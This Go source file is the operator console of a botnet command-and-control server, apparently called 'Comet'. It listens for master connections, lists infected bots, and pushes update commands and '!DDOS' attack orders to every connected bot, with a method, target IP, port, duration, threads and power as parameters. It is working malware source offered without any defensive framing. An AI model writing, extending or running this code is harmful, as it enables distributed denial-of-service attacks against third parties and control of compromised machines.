package socket

import (
	"bufio"
	"cnc/lib/utils"
	"fmt"
	"net"
	"net/textproto"
	"strings"
	"time"
)

func (m *Master) SendData(Payload string) {
	_, err := m.Network.Socket.Write([]byte(fmt.Sprintf("%s\n\r", Payload)))

	if err != nil {
		m.Network.Connected = false
	}
}

func (m *Master) ClearConsole() {
	_, err := m.Network.Socket.Write([]byte(utils.GetClear()))

	if err != nil {
		m.Network.Connected = false
	}
}

func (m *Master) SetTitle(Title string) {
	_, err := m.Network.Socket.Write([]byte(utils.GetTitle(Title)))

	if err != nil {
		m.Network.Connected = false
	}
}

func (m *Master) TitleThread() {
	for {
		m.SetTitle(fmt.Sprintf("%d bots | Comet.", len(BotList)))
		time.Sleep(time.Second * 1)
	}
}

func (m *Master) HandleConnection() {
	utils.Debug(fmt.Sprintf("[*] New Master connected --> %s", m.Network.Socket.RemoteAddr()))
	MasterList = append(MasterList, m)

	defer func() {
		m.Network.Socket.Close()
	}()

	for m.Network.Connected {
		m.Network.Socket.Write([]byte(fmt.Sprintf("%srooт%s@%scoмeт:~# %s", utils.GetRGB(160, 162, 163), utils.GetRGB(255, 0, 0), utils.GetRGB(160, 162, 163), utils.GetRGB(197, 198, 199))))
		success, data := m.Input()

		if !success {
			m.Network.Connected = false
		}

		args := strings.Split(data, " ")

		if args[0] == "?" && len(args) == 1 {
			m.SendData("")
			m.SendData("   | .devιceѕ - ѕнow coɴɴecтed вoтѕ.")
			m.SendData("   | .υpdαтe  - υpdαтe вoт.")
			m.SendData("   | .αcĸ     - Rυɴ αттαcĸ.")
			m.SendData("")
		}

		if args[0] == "clear" && len(args) == 1 {
			m.ClearConsole()
		}

		if args[0] == ".devices" && len(args) == 1 {
			m.SendData("")
			m.SendData("   | Verѕιoɴ | αrcн | αddreѕѕ")
			for _, bot := range BotList {
				m.SendData(fmt.Sprintf("   | %s - %s - %s", bot.Version, bot.Arch, strings.Split(bot.Network.Socket.RemoteAddr().String(), ":")[0]))
			}
			m.SendData("")
		}

		if args[0] == ".update" && len(args) == 1 {
			r := SendToAllBots("!UPDATE")
			m.SendData(fmt.Sprintf("   | %s%d%s вoтѕ υpdαтed.", utils.GetRGB(255, 0, 0), r, utils.GetRGB(160, 162, 163)))
		}

		if args[0] == ".ack" && len(args) < 7 {
			m.SendData("   | ιɴvαlιd αrɢυмeɴтѕ. (.αcĸ мeтнod ιp porт тιмe тнreαd power)")
		}

		if args[0] == ".ack" && len(args) == 7 {
			// мeтнod ιp porт тιмe тнreαd power
			// MOJI, VSE, HEX, IPSEC, FMS, HTTP

			method := args[1]
			ip := args[2]
			port := args[3]
			time := args[4]
			threads := args[5]
			power := args[6]

			r := SendToAllBots(fmt.Sprintf("!DDOS %s %s %s %s %s %s", method, ip, port, time, threads, power))
			m.SendData(fmt.Sprintf("   | αттαcĸ dιѕтrιвυтed тo %s%d%s вoтѕ.", utils.GetRGB(255, 0, 0), r, utils.GetRGB(160, 162, 163)))
		}
	}
}

func (b *Master) Input() (bool, string) {
	content := ""

	for b.Network.Connected && content == "" {
		data, err := textproto.NewReader(bufio.NewReader(b.Network.Socket)).ReadLine()

		if data == "" {
			continue
		}

		if err != nil {
			return false, ""
		}

		content = string(data)
	}

	return true, content
}

func StartMasterServer() {
	socket, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", utils.MasterSocketPort))
	utils.HandleError(err)

	utils.Log(fmt.Sprintf("[*] [MASTER] Server open on port %d", utils.MasterSocketPort))

	for {
		conn, err := socket.Accept()
		utils.HandleError(err)

		m := Master{
			Network: MasterSocket{
				Connected: true,
				Socket:    conn,
			},
		}

		m.ClearConsole()
		go m.TitleThread()
		go m.HandleConnection()
	}
}
